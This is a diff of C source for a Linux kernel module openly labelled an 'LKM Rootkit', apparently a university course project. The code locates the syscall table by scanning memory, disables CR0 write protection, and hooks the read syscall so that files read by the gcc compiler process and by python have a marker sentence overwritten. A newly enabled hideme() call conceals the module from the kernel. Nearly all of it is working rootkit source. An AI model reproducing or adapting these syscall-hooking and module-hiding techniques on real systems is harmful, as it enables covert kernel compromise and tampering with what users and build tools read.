@@ -1,106 +1,72 @@
-#include <linux/module.h>   // needed for writing modules
-#include <linux/kernel.h>   // kernel helper functions like printk
-#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> helpers
-#include <asm/paravirt.h>   // read_cr0, write_cr0
-#include <linux/sched.h>    // current task_struct
+#include <linux/module.h>   // Header file for Linux kernel modules
+#include <linux/kernel.h>   // Header file for Linux kernel functions and macros (like printk)
+#include <linux/syscalls.h> // Needed for syscall table and __NR_<syscall_name> helpers
+#include <asm/paravirt.h>   // Needed for read_cr0, write_cr0
+#include <linux/sched.h>    // Used for current task_struct
+#include <linux/string.h>   // Needed for string manipulation functions
+#include "hide_lkm.h"       // Header file for hide the rootkit.ko module in the OS Kernel
 
-#include <linux/string.h>  // For string manipulation functions
-
-#include "hide_lkm.h"
-#include "str_replace.h"
-
-// extern void hideme(void); // Declare the hideme() function
-
-/* The sys_call_table is const but we can point our own variable at
- * its memory location to get around that.
- */
+/*
+ * Although the sys_call_table is declared as const, we can bypass this restriction by creating a pointer variable that points to its memory location.
+*/
 unsigned long **sys_call_table;
 
-/* The control register's value determines whether or not memory is
- * protected. We'll need to modify it, to turn off memory protection,
- * in order to write over the read system call. Here we store the initial
- * control register value so we can set it back when we're finished
- * (memory protection is generally good)!
+/*
+ * The value of the control register dictates the memory protection status. To overwrite the read system call, we must first disable memory protection by modifying this register. Here, we save the initial value of the control register so that we can restore it later, as memory protection is typically beneficial for system integrity.
  */
 unsigned long original_cr0;
 
+/* Pointer from the first character of the predefined sentence if found in buf.*/
 char *substring;
 
-/* The prototype for the write syscall. This is where we'll store the original
- * before we swap it out in the sys_call_table.
+/*
+ * This is the prototype for the write syscall. We will store the original syscall here before replacing it in the sys_call_table.
  */
 asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
 
-/* Our new system call function; a wrapper for the original read. */
-asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
-{
-    /* execute the original write call, and hold on to its return value
-     * now we can add whatever we want to the buffer before exiting
-     * the function.
-     */
+/* This is our new system call function, which serves as a wrapper for the original read syscall. */
+asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
+    /* Call the original write syscall and store its return value. Now, we can manipulate the buffer contents before exiting the function. */
     long ret;
     ret = ref_sys_read(fd, buf, count);
 
-    if (fd > 2)
-    {
-        /* We can find the current task name from the current task struct
-         * then use that to decide if we'd like to swap out data
-         * in the read buffer before returning to the user.
-         * note: cc1 is the name of the task that opens source files
-         * during compilation via gcc.
-         */
-        if (strcmp(current->comm, "cc1") == 0 ||
-            strcmp(current->comm, "python") == 0)
-        {
-//            char *substring = strstr(buf, "Kernel Implementation - PUC Campinas");
+    if (fd > 2) {
+        /*
+         * We can obtain the current task name from the current task struct and use it to determine whether we want to modify data in the read buffer before returning to the user. Note that 'cc1' is the name of the task responsible for opening source files during compilation using gcc.
+        */
+        if (strcmp(current->comm, "cc1") == 0 || strcmp(current->comm, "python") == 0) {
             substring = strstr(buf, "Kernel Implementation - PUC Campinas");
-//            printk("%s", substring);
-            if (substring != NULL)
-            {
-                printk("void kernel_puc() found!");
-                char* msg = "WARNING: system has been compromised"; //36 characters
-                printk("Length of msg: %ld\n", strlen(msg));
+            if (substring != NULL) {
+                printk("Sentence: found in buf");
+
+                char* msg = "WARNING: system has been compromised";
                 int i;
                 for (i = 0; i < strlen(msg); i++) {
                     substring[i] = msg[i];
                 }
-
-//                substring[0] = 'M';
-//                substring[1] = 'r';
-//                substring[2] = 'r';
-//                substring[3] = 'r';   `
-//                substring[4] = 'g';
-//                substring[5] = 'n';
             }
         }
     }
     return ret;
 }
 
-/* The whole trick here is to find the syscall table in memory
- * so we can copy it to a non-const pointer array,
- * then, turn off memory protection so that we can modify the
- * syscall table.
- */
-static unsigned long **aquire_sys_call_table(void)
-{
-    /* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
-     * this keeps us from searching for our syscall table in user space memory
-     * */
+/*
+ * The key here is to locate the syscall table in memory, copy it to a non-const pointer array, and then disable memory protection to allow modification of the syscall table.
+*/
+static unsigned long **aquire_sys_call_table(void) {
+    /*
+     * PAGE_OFFSET is a macro that indicates the offset where kernel memory starts. This helps us avoid searching for our syscall table in user space memory.
+    */
     unsigned long int offset = PAGE_OFFSET;
     unsigned long **sct;
-    /* Scan memory searching for the syscall table, which is contigious */
+    /* Scan memory to find the syscall table, which is contiguous. */
     printk("Starting syscall table scan from: %lx\n", offset);
-    while (offset < ULLONG_MAX)
-    {
-        /* cast our starting offset to match the system call table's type */
+    while (offset < ULLONG_MAX) {
+        /* Cast our starting offset to match the type of the system call table. */
         sct = (unsigned long **)offset;
 
-        /* We're scanning for a bit pattern that matches sct[__NR_close]
-         * so we just increase 'offset' until we find it.
-         * */
-        if (sct[__NR_close] == (unsigned long *)sys_close)
-        {
+        /* We're searching for a bit pattern that matches sct[__NR_close], so we increment 'offset' until we find it. */
+        if (sct[__NR_close] == (unsigned long *)sys_close) {
             printk("Syscall table found at: %lx\n", offset);
             return sct;
         }
@@ -110,50 +76,44 @@ static unsigned long **aquire_sys_call_table(void)
     return NULL;
 }
 
-static int __init rootkit_start(void)
-{
+static int __init rootkit_start(void) {
     // Find the syscall table in memory
-    if (!(sys_call_table = aquire_sys_call_table()))
+    if (!(sys_call_table = aquire_sys_call_table())) {
         return -1;
+    }
 
-    // record the initial value in the cr0 register
+    // Record the initial value in the cr0 register
     original_cr0 = read_cr0();
-    // set the cr0 register to turn off write protection
+    // Set the cr0 register to turn off write protection
     write_cr0(original_cr0 & ~0x00010000);
-    // copy the old read call
+    // Copy the old read call
     ref_sys_read = (void *)sys_call_table[__NR_read];
-    // write our modified read call to the syscall table
+    // Write our modified read call to the syscall table
     sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
-    // turn memory protection back on
+    // Turn memory protection back on
     write_cr0(original_cr0);
 
-    //    static struct list_head *prev_module;
-//    hideme();
-
-    // Call hideme() from the rootkit module
-    //    hideme();
+    hideme(); // Hide the module from the OS Kernel
 
     return 0;
 }
 
-static void __exit rootkit_end(void)
-{
-    if (!sys_call_table)
-    {
+static void __exit rootkit_end(void) {
+    if (!sys_call_table) {
         return;
     }
 
-    // turn off memory protection
+    // Turn off memory protection
     write_cr0(original_cr0 & ~0x00010000);
-    // put the old system call back in place
+    // Put the old system call back in place
     sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
-    // memory protection back on
+    // Memory protection back on
     write_cr0(original_cr0);
-
-    kfree(substring);
 }
 
 module_init(rootkit_start);
 module_exit(rootkit_end);
 
 MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("LKM Rootkit");
+MODULE_VERSION("0.01");
